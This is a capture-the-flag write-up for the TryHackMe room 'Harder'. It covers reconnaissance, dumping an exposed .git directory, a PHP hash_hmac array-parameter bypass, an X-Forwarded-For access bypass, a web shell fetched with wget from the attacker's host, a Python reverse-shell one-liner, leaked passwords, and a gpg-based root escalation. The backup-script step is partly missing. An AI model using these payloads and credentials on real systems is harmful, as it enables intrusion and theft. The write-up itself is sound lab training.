# Harder

**Platform:** TryHackMe
**Date:** 2026-07-17
**Difficulty:** Medium
**Category:** Linux / Web
**Room URL:** https://tryhackme.com/room/harder
**Status:** ✅ Completed

---

## 📌 What Was This Room About?
> This room is about exploiting git and php to find two flags hidden across the target machine.

---

## 🔍 Reconnaissance
> What was the first thing you did? Always start with recon.

### Nmap Scan
```bash
nmap -sS -p- -n -Pn --min-rate=9362 10.10.139.114  
```

**Results:**
Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-09 01:49 EEST  
Nmap scan report for 10.10.139.114  
Host is up (0.14s latency).  
  
PORT   STATE SERVICE VERSION  
2/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)  
| ssh-hostkey:   
|   2048 f8:8c:1e:07:1d:f3:de:8a:01:f1:50:51:e4:e6:00:fe (RSA)  
|   256 e6:5d:ea:6c:83:86:20:de:f0:f0:3a:1e:5f:7d:47:b5 (ECDSA)  
|_  256 e9:ef:d3:78:db:9c:47:20:7e:62:82:9d:8f:6f:45:6a (ED25519)  
80/tcp open  http    nginx 1.18.0  
|_http-server-header: nginx/1.18.0  
|_http-title: Error  
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port  
Aggressive OS guesses: Linux 3.1 (95%), Linux 3.2 (95%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (94%), ASUS RT-N56U WAP (Linux 3.4) (93%), Linux 3.16 (93%), Android 4.1.1 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 (92%), Linux 2.6.32 - 3.10 (92%), Linux 2.6.32 - 3.9 (92%)  
No exact OS matches for host (test conditions non-ideal).  
Network Distance: 2 hops  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  
  
TRACEROUTE (using port 2/tcp)  
HOP RTT       ADDRESS  
1   94.45 ms  10.9.0.1  
2   133.01 ms 10.10.139.114  
  
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 20.17 seconds  

---

## 🧭 Steps I Took
### Step 1 — 
- **What I did:**  After running the nmap scan I started doing Enumeration. I visited the target website and this is what it looked like:
![1*IAPWXB4af87TvPhk9HS_BA.png](https://miro.medium.com/v2/resize:fit:700/1*IAPWXB4af87TvPhk9HS_BA.png)

I checked the source code and found nothing of interest. 

After searching the web page more I decided to enumerate the directories using gobuster:

`gobuster dir -u http://10.10.139.114/ -w ../wordlists/dirb/common.txt -t 50 --exclude-length 1985 |tee gobuster.txt   
``
===============================================================  
`Gobuster v3.6  
`by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  

`===============================================================  
`[+] Url:                     http://10.10.139.114/  
`[+] Method:                  GET  
`[+] Threads:                 50  
`[+] Wordlist:                ../wordlists/dirb/common.txt  
`[+] Negative Status codes:   404  
`[+] Exclude Length:          1985  
`[+] User Agent:              gobuster/3.6  

`[+] Timeout:                 10s  

`===============================================================  

`Starting gobuster in directory enumeration mode  

`===============================================================  
`/.bash_history        (Status: 403) [Size: 153]  
`/.cache               (Status: 403) [Size: 153]  
`/.bashrc              (Status: 403) [Size: 153]  
`/.config              (Status: 403) [Size: 153]  
`/.web                 (Status: 403) [Size: 153]  
`/.cvs                 (Status: 403) [Size: 153]  
`/.forward             (Status: 403) [Size: 153]  
`/.git/HEAD            (Status: 403) [Size: 153]  
`/.history             (Status: 403) [Size: 153]  
`/.hta                 (Status: 403) [Size: 153]  
`/.htaccess            (Status: 403) [Size: 153]  
`/.rhosts              (Status: 403) [Size: 153]  
`/.subversion          (Status: 403) [Size: 153]  
`/.cvsignore           (Status: 403) [Size: 153]  
`/.passwd              (Status: 403) [Size: 153]  
`/.listing             (Status: 403) [Size: 153]  
`/.svn/entries         (Status: 403) [Size: 153]  
`/.svn                 (Status: 403) [Size: 153]  
`/.listings            (Status: 403) [Size: 153]  
`/.ssh                 (Status: 403) [Size: 153]  
`/.profile             (Status: 403) [Size: 153]  
`/.sh_history          (Status: 403) [Size: 153]  
`/.swf                 (Status: 403) [Size: 153]  
`/.mysql_history       (Status: 403) [Size: 153]  
`/.perf                (Status: 403) [Size: 153]  
`/.htpasswd            (Status: 403) [Size: 153]  
`/phpinfo.php          (Status: 200) [Size: 86506]  
`/vendor               (Status: 301) [Size: 169] [--> http://10.10.139.114:8080/vendor/]  

`Progress: 4614 / 4615 (99.98%)  

`===============================================================  

`Finished 

`===============================================================

Found `/phpinfo.php` and `/vendor` that redirects to another web service on port `8080` but it’s closed.

`/phpinfo.php
![1*PUGbStekkVVH7tdP6gkCgA.png](https://miro.medium.com/v2/resize:fit:700/1*PUGbStekkVVH7tdP6gkCgA.png)

`/vendor`
![1*84dzLUud5gsfJuBrA-_yrQ.png](https://miro.medium.com/v2/resize:fit:700/1*84dzLUud5gsfJuBrA-_yrQ.png)

I then used curl to check if I could get a header response:

`root:# curl -I http://10.10.139.114/  
`HTTP/1.1 200 OK  
`Server: nginx/1.18.0  
`Date: Mon, 08 Jul 2024 23:52:13 GMT  
`Content-Type: text/html; charset=UTF-8  
`Connection: keep-alive  
`Vary: Accept-Encoding  
`X-Powered-By: PHP/7.3.19  
`Set-Cookie: TestCookie=just+a+test+cookie; expires=Tue, 09-Jul-2024 00:52:13 GMT; Max-Age=3600; path=/; domain=pwd.harder.local; secure

I found a domain and aded it to `/etc/hosts`.

root# cat /etc/hosts |grep "pwd"  
10.10.139.114 pwd.harder.local

I then did further directory enumeration on pwd.harder.local:

`gobuster dir -u http://pwd.harder.local/ -w ../wordlists/dirb/common.txt -t 50  |tee gobuster.txt   

`===============================================================  
`Gobuster v3.6  

`by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)  

`===============================================================  
`[+] Url:                     http://pwd.harder.local/  
`[+] Method:                  GET  
`[+] Threads:                 50  
`[+] Wordlist:                ../wordlists/dirb/common.txt  
`[+] Negative Status codes:   404  
`[+] User Agent:              gobuster/3.6  

`[+] Timeout:                 10s  

`===============================================================  

`Starting gobuster in directory enumeration mode  

`===============================================================  
`/.git/HEAD            (Status: 200) [Size: 23]  
`/index.php            (Status: 200) [Size: 19926]  

`Progress: 4614 / 4615 (99.98%)  

`===============================================================  

`Finished  

`===============================================================

Mmm /.git/HEAD sounds delicious. Time to see what it's hiding:

`wget http://pwd.harder.local/.git/config  
`--2024-07-09 03:08:15--  http://pwd.harder.local/.git/config  
`Resolving pwd.harder.local (pwd.harder.local)... 10.10.139.114  
`Connecting to pwd.harder.local (pwd.harder.local)|10.10.139.114|:80... connected.  
`HTTP request sent, awaiting response... 200 OK  
`Length: 92 [application/octet-stream]  
`Saving to: ‘config’  
  
`config                     100%[=====================================>]      92  --.-KB/s    in 0s        
  
`2024-07-09 03:08:16 (10.2 MB/s) - ‘config’ saved [92/92]  

Time to see what goodies these files contain!
`root# cat config   
`[core]  
 `repositoryformatversion = 0  
`` filemode = true  
 `bare = false  
`` logallrefupdates = true  

`root@Zain:/home/CTF/Harder# wget http://pwd.harder.local/.git/index` // I am now downloading the rest of the files
`--2024-07-09 03:08:52--  http://pwd.harder.local/.git/index  
`Resolving pwd.harder.local (pwd.harder.local)... 10.10.139.114  
`Connecting to pwd.harder.local (pwd.harder.local)|10.10.139.114|:80... connected.  
`HTTP request sent, awaiting response... 200 OK  
`Length: 361 [application/octet-stream]  
`Saving to: ‘index’  
  
`index                      100%[=====================================>]     361  --.-KB/s    in 0s        
  
`2024-07-09 03:08:52 (48.1 MB/s) - ‘index’ saved [361/361]  
  
`root# cat index   
`DIRC]��]��J���y���@�@I�^�  
`.gitignore]���]�����]  
                     `"���u��◈��;bbrtauth.php]��T]���I���fB�7�����,�a�ॽ�Mhmac.php]��R]�����`n���O��`�x�I�#eS�[;e index.phpTREE4 0  
`�6���� T3�T�'-�ۧ`�ޘ�flnb�ށkUJ�root@Zain:/home/CTF/Harder# file index   
`index: Git index, version 2, 4 entries  

Right now the contents of the file looks encoded, but I bet using my good old buddy `strings` should uncover some hidden files:
`root:/home/CTF/Harder# strings index   
`DIRC  
.`gitignore  
`;bbr  
`auth.php  
`hmac.php  
 `index.php  
`TREE  

Mmm auth.php, that means that there aught to be some auth forms in the site.


I then used `gitdumper.sh` to get all git files.

`root# ./gitdumper.sh http://pwd.harder.local/.git/ .  
`###########  

`GitDumper is part of https://github.com/internetwache/GitTools  

`Developed and maintained by @gehaxelt from @internetwache  

`Use at your own risk. Usage might be illegal in certain circumstances.   
`Only for educational purposes!  

`###########  
  
`[*] Destination folder does not exist  
`[+] Creating ./.git/  
`[+] Downloaded: HEAD  
`[-] Downloaded: objects/info/packs  
`[+] Downloaded: description  
`[+] Downloaded: config  
`[+] Downloaded: COMMIT_EDITMSG  
`[+] Downloaded: index  
`[-] Downloaded: packed-refs  
`[+] Downloaded: refs/heads/master  
`[-] Downloaded: refs/remotes/origin/HEAD  
`[-] Downloaded: refs/stash  
`[+] Downloaded: logs/HEAD  
`[+] Downloaded: logs/refs/heads/master  
`[-] Downloaded: logs/refs/remotes/origin/HEAD  
`[-] Downloaded: info/refs  
`[+] Downloaded: info/exclude  
`[-] Downloaded: /refs/wip/index/refs/heads/master  
`[-] Downloaded: /refs/wip/wtree/refs/heads/master  
`[+] Downloaded: objects/93/99abe877c92db19e7fc122d2879b470d7d6a58  
`[-] Downloaded: objects/00/00000000000000000000000000000000000000  
`[+] Downloaded: objects/ad/68cc6e2a786c4e671a6a00d6f7066dc1a49fc3  
`[+] Downloaded: objects/04/7afea4868d8b4ce8e7d6ca9eec9c82e3fe2161  
`[+] Downloaded: objects/e3/361e96c0a9db20541033f254df272deeb9dba7  
`[+] Downloaded: objects/c6/66164d58b28325393533478750410d6bbdff53  
`[+] Downloaded: objects/aa/938abf60c64cdb2d37d699409f77427c1b3826  
`[+] Downloaded: objects/cd/a7930579f48816fac740e2404903995e0ff614  
`[+] Downloaded: objects/22/8694f875f20080e29788d7cc3b626272107462  
`[+] Downloaded: objects/66/428e37f6bfaac0b42ce66106bee0a5bdf94d4e  
`[+] Downloaded: objects/6e/1096eae64fede71a78e54999236553b75b3b65  
`[+] Downloaded: objects/be/c719ffb34ca3d424bd170df5f6f37050d8a91c  

Time to explore the files gitdumper downloaded:
`root# ls -la
`total 40  
`drwxrwxr-x  3 zain zain 4096 Jul  9 03:31 ./  
`drwxr-xr-x 33 zain zain 4096 Jul  9 03:25 ../  
`-rw-r--r--  1 root root   92 Oct  3  2019 config  
`drwxr-xr-x  6 root root 4096 Jul  9 03:31 .git/  
`-rwxr-xr-x  1 root root 4389 Jul  9 03:31 gitdumper.sh*  
`-rw-r--r--  1 root root 1313 Jul  9 03:06 git.txt  
`-rw-r--r--  1 root root  848 Jul  9 03:12 gobuster.txt  
`-rw-r--r--  1 root root  361 Oct  3  2019 index  


`root# cd .git/  
`root@Zain:/home/CTF/Harder/.git# ls  
`COMMIT_EDITMSG  config  description  HEAD  index  info  logs  objects  refs  

`root# cat logs/HEAD   
`0000000000000000000000000000000000000000 ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3 evs <evs@harder.local> 1570100452 +0300 commit (initial): added index.php  
`ad68cc6e2a786c4e671a6a00d6f7066dc1a49fc3 047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161 evs <evs@harder.local> 1570115492 +0300 commit: add extra security  
`047afea4868d8b4ce8e7d6ca9eec9c82e3fe2161 9399abe877c92db19e7fc122d2879b470d7d6a58 evs <evs@harder.local> 1570115543 +0300 commit: add gitignore

I then got a copy of the files and viewed them.

`root# git checkout .  
`Updated 4 paths from the index  

`root# ls -la  
`total 76  
`drwxrwxr-x  3 tgrade tgrade  4096 Jul  9 03:39 ./  
`drwxr-xr-x 33 tgrade tgrade  4096 Jul  9 03:25 ../  
`-rw-r--r--  1 root root 23820 Jul  9 03:39 auth.php  
`-rw-r--r--  1 root root    92 Oct  3  2019 config  
`drwxr-xr-x  6 root root  4096 Jul  9 03:39 .git/  
`-rwxr-xr-x  1 root root  4389 Jul  9 03:31 gitdumper.sh*  
`-rw-r--r--  1 root root    27 Jul  9 03:39 .gitignore  
`-rw-r--r--  1 root root  1313 Jul  9 03:06 git.txt  
`-rw-r--r--  1 root root   848 Jul  9 03:12 gobuster.txt  
`-rw-r--r--  1 root root   431 Jul  9 03:39 hmac.php  
`-rw-r--r--  1 root root   361 Oct  3  2019 index  
`-rw-r--r--  1 root root   608 Jul  9 03:39 index.php  

`root# cat .gitignore   
`credentials.php  
`secret.php

Oh yeah I like the names of those two files!
Unfortunately, it looks like the 2 useful files are unavailable:  
I then viewed `index.php`

`root# cat index.php   
`<?php  
  `session_start();  
  `require("auth.php");  
  `$login = new Login;  
  `$login->authorize();  
  `require("hmac.php");  
  `require("credentials.php");  
`?>   
  <table style="border: 1px solid;">  
     <tr>  
       <td style="border: 1px solid;">url</td>  
       <td style="border: 1px solid;">username</td>  
       <td style="border: 1px solid;">password (cleartext)</td>  
     </tr>  
     <tr>  
       <td style="border: 1px solid;"><?php echo $creds[0]; ?></td>  
       <td style="border: 1px solid;"><?php echo $creds[1]; ?></td>  
       <td style="border: 1px solid;"><?php echo $creds[2]; ?></td>  
     </tr>  
   </table>

It requires `hmac.php` , good thing I have it:

`root# cat hmac.php   
`<?php  
`if (empty($_GET['h']) || empty($_GET['host'])) {  
   `header('HTTP/1.0 400 Bad Request');  
   `print("missing get parameter");  
   `die();  
`}  
`require("secret.php"); //set $secret var  
`if (isset($_GET['n'])) {  
   `$secret = hash_hmac('sha256', $_GET['n'], $secret);  
`}  
  
`$hm = hash_hmac('sha256', $_GET['host'], $secret);  
`if ($hm !== $_GET['h']){  
  `header('HTTP/1.0 403 Forbidden');  
  `print("extra security check failed");  
  `die();  
`}  
`?>


Defined in `hmac.php` there’s injecting the appropriate GET variables (`h`, `n` and `host`). The ultimate test will check that our `h` value is equal to `$hm`, which is itself defined as follows:

$hm = hash_hmac('sha256', $_GET['host'], hash_hmac('sha256', $_GET['n'], $secret));

I Searched on the Internet how to bypass `hash_hmac` and found this [Post](https://exploit-notes.hdks.org/exploit/web/php-hash-hmac-bypass/).  
If the website uses `hash_hmac` function on PHP as below, we can bypass by injecting parameters.

When executing the following command, the `hash_hmac` returns false.  
Let’s test that theory, shall we:

`$ php -r "echo hash_hmac('sha256', Array(), 'secret')== false;"  
`PHP Warning:  hash_hmac() expects parameter 2 to be string, array given in Command line code on line 1  
`1

I then Created a Hmac hash by running below.  
root# php -r "echo hash_hmac('sha256', 'pwd.harder.local', false) . \"\n\";"  
5b622e20b29bdbcb0a4881f1d117d20a33a1f78a3c07ba85645567607e75cedf  

Now, I sent the request:

http://pwd.harder.local/?n[]=&h=5b622e20b29bdbcb0a4881f1d117d20a33a1f78a3c07ba85645567607e75cedf&host=pwd.harder.local

Boyah!!! The username and password of new subdomain
![](https://miro.medium.com/v2/resize:fit:700/1*-XKomErMTGSWs8-XyTiP4g.png)

I then tried it on the url of the table above:

![](https://miro.medium.com/v2/resize:fit:700/1*OW0N3gEHdM3NAi_QyjRBtg.png)


- **Command/Tool used:**
```bash
# gobuster dir -u http://10.10.139.114/ -w ../wordlists/dirb/common.txt -t 50 --exclude-length 1985 |tee gobuster.txt   
# curl -I http://10.10.139.114/  
# cat /etc/hosts |grep "pwd"  
# gobuster dir -u http://pwd.harder.local/ -w ../wordlists/dirb/common.txt -t 50  |tee gobuster.txt   
# wget http://pwd.harder.local/.git/config  
# cat config
# wget http://pwd.harder.local/.git/index
# cat index 
# strings index
# ./gitdumper.sh http://pwd.harder.local/.git/ .
# ls -la
# cd .git/
# ls
# cat logs/HEAD 
# git checkout .
# cat .gitignore
# cat index.php 
# cat hmac.php
# php -r "echo hash_hmac('sha256', Array(), 'secret')== false;"
# php -r "echo hash_hmac('sha256', 'pwd.harder.local', false) . \"\n\";"  
```
- **What I found:** I was able to learn something new with this challenge, I learned more about php, hmac, and more.
- **Why it matters:** This matters because now I have a deeper understanding of these topics and it will help me when I encounter a challenge like this in the future.

### Step 2 — 
- **What I did:**  EXPLOITATION TIME BABY!!! After typing in the credentials it led me to this page:
  ![1*MH6SykAOmPIvia5-y0mcqw.png](https://miro.medium.com/v2/resize:fit:679/1*MH6SykAOmPIvia5-y0mcqw.png)

It only accepts specific IPs, I then added  the `X-Forwarded-For` header and sign the IP wanted : `X-Forwarded-For: 10.10.10.1`  using `burp suite` and access this domain.

And now I got a beautiful web shell:
![1*4OD3LzWoMUh0QbM_hO2Zwg.png](https://miro.medium.com/v2/resize:fit:700/1*4OD3LzWoMUh0QbM_hO2Zwg.png)

I ran a few commands to make sure it is real thing. And it was the real thing!
![1*xO-fEMRJaZraDftYg23glA.png](https://miro.medium.com/v2/resize:fit:700/1*xO-fEMRJaZraDftYg23glA.png)

I uploaded a Sample PHP Web Shell using python3 server!

`root# python -m http.server 80  
`Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...  
`10.10.131.253 - - [10/Jul/2024 01:21:57] "GET /sh.php HTTP/1.1" 200 -

`Time to put the web shell on the target machine!

`root# curl -X POST http://shell.harder.local/   -H "Host: shell.harder.local"   -H "User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:127.0) Gecko/20100101 Firefox/127.0"   -H "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"   -H "Accept-Language: en-US,en;q=0.5"   -H "Accept-Encoding: gzip, deflate, br"   -H "Referer: http://shell.harder.local/"   -H "Content-Type: application/x-www-form-urlencoded"   -H "Origin: http://shell.harder.local"   -H "DNT: 1"   -H "Sec-GPC: 1"   -H "Connection: close"   -H "Cookie: PHPSESSID=794cdqirbvhmo26pkb793b8764; login_user=evs; login_pass=2f9bb0db1b60ebadded465d641cc65eb"   -H "X-Forwarded-For: 10.10.10.1"   -H "Upgrade-Insecure-Requests: 1"   --data "cmd=wget http://10.9.4.50:80/sh.php" --compressed -o response.html  
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current  
                                 Dload  Upload   Total   Spent    Left  Speed  
100   696    0   661  100    35   1727     91 --:--:-- --:--:-- --:--:--  1817  


![](https://miro.medium.com/v2/resize:fit:639/1*pm_WPk8WhZbkOfgysHqMTg.png)

After I uploaded the web shell I got the user flag!!!!!!!

![](https://miro.medium.com/v2/resize:fit:671/1*Je6JFB2IAcrxNlhJZjJsBw.png)

Now let’s try get reverse connection back I tried to get a connection back with `bash` but didn’t work so I checked if it existed or not.


![](https://miro.medium.com/v2/resize:fit:700/1*XWmgoUh9vJArSjJGYyPrDA.png)

`python3` exists, so using python I tried to get a connection back, with following command :

`shell.harder.local/sh.php?cmd=python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.24",8088));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")'

I started a listener on port 8080 and waited:

`root@Zain:/home/CTF/Harder# nc -lvnp 8088  
`Listening on 0.0.0.0 8088  
`Connection received on 10.10.224.32 50672  
`/www/shell $ id  
``  id  
`uid=1001(www) gid=1001(www) groups=1001(www)  
`/www/shell $ 

`evs:x:1000:1000:Linux User,,,:/home/evs:/bin/ash  
`www:x:1001:1001:www:/home/www:/bin/ash

I didn't have to wait long, I got a REVERSE SHELL!

- **Command/Tool used:**
```bash
# python -m http.server 80 
# curl -X POST http://shell.harder.local/   -H "Host: shell.harder.local"   -H
# shell.harder.local/sh.php?cmd=python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.9.0.24",8088));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")
# nc -lvnp 8088
```

### Step 3 — 
- **What I did:** Time to get the root flag. I started by searching the SUID permissions and capabilities and `crontab` file

`/www/shell $ find / -perm -4000 2>/dev/null  
`find / -perm -4000 2>/dev/null  
`/usr/local/bin/execute-crypted  
`/www/shell $ getcap -r / 2>/dev/null  
`getcap -r / 2>/dev/null  
`/www/shell $ cat /etc/crontab  
`cat /etc/crontab  
`cat: can't open '/etc/crontab': No such file or directory  
`/www/shell $ 

I  tried to see what was in `execute-crypted`

`/www/shell $ strings /usr/local/bin/execute-crypted  
`strings /usr/local/bin/execute-crypted  
`strings: /usr/local/bin/execute-crypted: Permission denied  
`/www/shell $  
`/www/shell $ ls  -l /usr/local/bin/execute-crypted  
`ls  -l /usr/local/bin/execute-crypted  
`-rwsr-x---    1 root     evs          19960 Jul  6  2020 /usr/local/bin/execute-crypted

Permission denied, always never liked that word 😡.

I tried to snoop around the files that my low level user privileges could allow me to snoop.

`/ $ ls -la    
`ls -la  
`total 92  
`drwxr-xr-x    1 root     root          4096 Jul  7  2020 .  
`drwxr-xr-x    1 root     root          4096 Jul  7  2020 ..  
`-rwxr-xr-x    1 root     root             0 Jul  7  2020 .dockerenv  
`drwxr-xr-x    2 root     root          4096 May 29  2020 bin  
`drwxr-xr-x    5 root     root           360 Jul 11 22:58 dev  
`drwxr-xr-x    1 root     root          4096 Aug 18  2020 etc  
`drwxr-xr-x    1 root     root          4096 Jul  7  2020 home  
`drwxr-xr-x    1 root     root          4096 Jul  7  2020 lib  
`drwxr-xr-x    5 root     root          4096 May 29  2020 media  
`drwxr-xr-x    2 root     root          4096 May 29  2020 mnt  
`drwxr-xr-x    2 root     root          4096 May 29  2020 opt  
`dr-xr-xr-x  115 root     root             0 Jul 11 22:57 proc  
`drwx------    1 root     root          4096 Jul  7  2020 root  
`drwxr-xr-x    1 root     root          4096 Jul 11 22:58 run  
`drwxr-xr-x    2 root     root          4096 May 29  2020 sbin  
`drwxr-xr-x    2 root     root          4096 May 29  2020 srv  
`dr-xr-xr-x   13 root     root             0 Jul 11 22:57 sys  
`drwxrwxrwt    1 root     root          4096 Jul 11 22:58 tmp  
`drwxr-xr-x    1 root     root          4096 Jul  7  2020 usr  
`drwxr-xr-x    1 root     root          4096 Jul  7  2020 var  
`drwxr-xr-x    1 www      www           4096 Jul  7  2020 www  
`/ $

There’s `.dockerenv` file , may be there might be something interesting in the docker container.
Enumerating the files owned by `www` reveals the presence of an interesting file:

`/ $ find / -type f -user www 2>/dev/null  
`find / -type f -user www 2>/dev/null  
`/tmp/sess_utu0095om9rr89vk98njrm2t2t  
`/tmp/sess_794cdqirbvhmo26pkb793b8764  
`/tmp/sess_i1k531238si1mefmcngopm4boa  
`/home/www/.ash_history  
`/var/lib/nginx/html/50x.html  
`/var/lib/nginx/html/index.html  
`/etc/periodic/15min/evs-backup.sh  
`/proc/10/task/10/fdinfo/0  
`/proc/10/task/10/fdinfo/1  
`/proc/10/task/10/fdinfo/2  
`/proc/10/task/10/fdinfo/4  
`/proc/10/task/10/fdinfo/5

 My heart literally skipped a beat in joy when I saw `evs-backup.sh`.

`/ $ ls -l /etc/periodic/15min/evs-backup.sh  
`ls -l /etc/periodic/15min/evs-backup.sh  
`-rwxr-xr-x    1 www      www            190 Jul  6  2020 /etc/periodic/15min/evs-backup.sh  
`/ $ cat /etc/periodic/15min/evs-backup.sh  
`cat /etc/periodic/15min/evs-backup.sh  
`#!/bin/ash  
  
I then created a backup script, that saves the /www directory to our internal server, and then 
for authentication I used ssh with user "evs" and password "U6j1brxGqbsUA$pMuIodnb$SZB4$bw14"

`harder:~$ id  
`uid=1000(evs) gid=1000(evs) groups=1000(evs)  
`harder:~$

`Now I got access Let try see `execute-crypted` file.

`harder:~$ strings /usr/local/bin/execute-crypted |more  
`/lib/ld-musl-x86_64.so.1  
`libc.musl-x86_64.so.1  
`__stack_chk_fail  
`_init  
`asprintf  
`setuid  
`_fini  
`system  
`__cxa_finalize  
`free  
`__libc_start_main  
`__deregister_frame_info  
`_ITM_registerTMCloneTable  
`_ITM_deregisterTMCloneTable  
`__register_frame_info  
`u{UH  
`ATSt  
`/usr/local/bin/run-crypted.sh %s                             <=== Interesting  
`/usr/local/bin/run-crypted.sh  
`;*3$"  
`GCC: (Alpine 8.3.0) 8.3.0  
`obj/include/bits  
`./src/include/../../include  
.`/src/include  
`--More--   

I started enumerating the file:
`harder:~$ ls -l /usr/local/bin/run-crypted.sh  
`-rwxr-x---    1 root     evs            412 Jul  7  2020 /usr/local/bin/run-crypted.sh  
`harder:~$  
`harder:~$ cat /usr/local/bin/run-crypted.sh  
`#!/bin/sh  
  
`if [ $# -eq 0 ]  
  `then  
  ``  echo -n "[*] Current User: ";  
  ``  whoami;  
  ``  echo "[-] This program runs only commands which are encypted for root@harder.local using gpg."  
 ``   echo "[-] Create a file like this: echo -n whoami > command"  
 ``   echo "[-] Encrypt the file and run the command: execute-crypted command.gpg"  
  `else  
  ``  export GNUPGHOME=/root/.gnupg/  
  ``  gpg --decrypt --no-verbose "$1" | ash  
`fi

Can’t modify this script :(  
I then tried running `execute-crypted` , and I confirmed that program executes as root:

`harder:~$  /usr/local/bin/execute-crypted   
`[*] Current User: root  
`[-] This program runs only commands which are encypted for root@harder.local using gpg.  
`[-] Create a file like this: echo -n whoami > command  
`[-] Encrypt the file and run the command: execute-crypted command.gpg  
`harder:~$ 

I then searched for the GPG root key : root@harder

`harder:~$ find / -type f -name "root@harder.local*" 2>/dev/null  
`/var/backup/root@harder.local.pub  
`harder:~$ cat /var/backup/root@harder.local.pub  
`-----BEGIN PGP PUBLIC KEY BLOCK-----  
  
`mDMEXwTf8RYJKwYBBAHaRw8BAQdAkJtb3UCYvPmb1/JyRPADF0uYjU42h7REPlOK  
`AbiN88i0IUFkbWluaXN0cmF0b3IgPHJvb3RAaGFyZGVyLmxvY2FsPoiQBBMWCAA4  
`FiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwMFCwkIBwIGFQoJCAsCBBYC  
`AwECHgECF4AACgkQyR1mFZRPaHSt8wD8CvJLt7qyCXuJZdOBPR+X7GI2dUg0DRRu  
`c5gXzwk3rMMA/0JK6ZwZCHObWjwX0oLc3jvOCgQiIdaPq1WqN9/fhLAKuDgEXwTf  
`8RIKKwYBBAGXVQEFAQEHQNa/To/VntzySOVdvOCW+iGscTLlnsjOmiGaaWvJG14O  
`AwEIB4h4BBgWCAAgFiEEb5liHk1ktq/OVuhkyR1mFZRPaHQFAl8E3/ECGwwACgkQ  
`yR1mFZRPaHTMLQD/cqbV4dMvINa/KxATQDnbaln1Lg0jI9Jie39U44GKRIEBAJyi  
`+2AO+ERYahiVzkWwTEoUpjDJIv0cP/WVzfTvPk0D  
`=qaa6  
`-----END PGP PUBLIC KEY BLOCK-----  
  
`harder:~$ 

It’s a backup of the public key, OHHHH yeah now we're getting somewhere! Time to import this bad boy:

`harder:~$ gpg --import /var/backup/root@harder.local.pub  
`gpg: directory '/home/evs/.gnupg' created  
`gpg: keybox '/home/evs/.gnupg/pubring.kbx' created  
`gpg: /home/evs/.gnupg/trustdb.gpg: trustdb created  
`gpg: key C91D6615944F6874: public key "Administrator <root@harder.local>" imported  
`gpg: Total number processed: 1  
`gpg:               imported: 1  
`harder:~$ gpg --list-keys  

`/home/evs/.gnupg/pubring.kbx  

----------------------------  
`pub   ed25519 2020-07-07 [SC]  
      6F99621E4D64B6AFCE56E864C91D6615944F6874  
`uid           [ unknown] Administrator <root@harder.local>  
`sub   cv25519 2020-07-07 [E]  
  
`harder:~$

Now, I dumped the content of the root

`harder:~$ echo -n "cat /root/root.txt" > command  
`harder:~$ gpg -e -r "Administrator" command  
`gpg: 6C1C04522C049868: There is no assurance this key belongs to the named user  
  
`sub  cv25519/6C1C04522C049868 2020-07-07 Administrator <root@harder.local>  
 `Primary key fingerprint: 6F99 621E 4D64 B6AF CE56  E864 C91D 6615 944F 6874  
      `Subkey fingerprint: E51F 4262 1DB8 87CB DC36  11CD 6C1C 0452 2C04 9868  
  
It is not certain that the key belongs to the person named user ID.  But since we are good Samaritans we should just press YES so that we gain access to the targets computer so that we can 'keep it safe' 😏

`harder:~$ ls                  
`command      command.gpg  user.txt  
`harder:~$  /usr/local/bin/execute-crypted command.gpg  
`gpg: encrypted with 256-bit ECDH key, ID 6C1C04522C049868, created 2020-07-07  
      "Administrator <root@harder.local>"  
`3a7bd72672889e0756b09f0566935a6c  
`harder:~$

ROOT FLAG: `3a7bd72672889e0756b09f0566935a6c
- **Command/Tool used:**
```bash
# find / -perm -4000 2>/dev/null
# getcap -r / 2>/dev/null
# cat /etc/crontab
# strings /usr/local/bin/execute-crypted
# find / -type f -user www 2>/dev/null
# cat /etc/periodic/15min/evs-backup.sh
# ssh evs@10.10.139.114  (using creds found in backup script)
# strings /usr/local/bin/execute-crypted | more
# ls -l /usr/local/bin/run-crypted.sh
# cat /usr/local/bin/run-crypted.sh
# /usr/local/bin/execute-crypted
# find / -type f -name "root@harder.local*" 2>/dev/null
# cat /var/backup/root@harder.local.pub
# gpg --import /var/backup/root@harder.local.pub
# gpg --list-keys
# echo -n "cat /root/root.txt" > command
# gpg -e -r "Administrator" command
# /usr/local/bin/execute-crypted command.gpg
```

---

## 🛠 Commands Used

| Command                                                                  | What It Does                                                                                    |
| ------------------------------------------------------------------------ | ----------------------------------------------------------------------------------------------- |
| `nmap -sS -p- -n -Pn --min-rate=9362 10.10.139.114`                      | Full TCP SYN scan across all ports at high speed                                                |
| `gobuster dir -u http://<ip>/ -w common.txt -t 50 --exclude-length 1985` | Directory brute-force, filtering out a known response size                                      |
| `curl -I http://<ip>/`                                                   | Grabs HTTP response headers only                                                                |
| `cat /etc/hosts \| grep "pwd"`                                           | Confirms a custom domain entry was added to hosts file                                          |
| `gobuster dir -u http://pwd.harder.local/ -w common.txt -t 50`           | Directory brute-force against the discovered vhost                                              |
| `wget http://pwd.harder.local/.git/config`                               | Downloads exposed git config file                                                               |
| `cat config`                                                             | Views git config contents                                                                       |
